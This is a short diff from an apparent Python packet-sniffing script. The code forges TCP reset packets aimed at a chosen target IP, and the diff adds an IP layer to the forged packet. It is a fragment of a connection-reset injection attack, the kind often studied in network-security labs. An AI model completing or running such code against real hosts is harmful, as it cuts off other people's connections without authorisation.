@@ -10,7 +10,7 @@ def pkt_callback(packet):
         #print("seq: %d, ack: %d" % (packet[TCP].seq, packet[TCP].ack))
         #print("next seq: %d, next ack: %d" % (packet[TCP].ack, packet[TCP].seq + len(packet[TCP])-32))
         if (packet[IP].dst == target_ip):
-            resetPkt = TCP()
+            resetPkt = (IP()/TCP())
             #set reset packet
             resetPkt[TCP].flags = 'R'
             #the seq number should be whatever was last acked
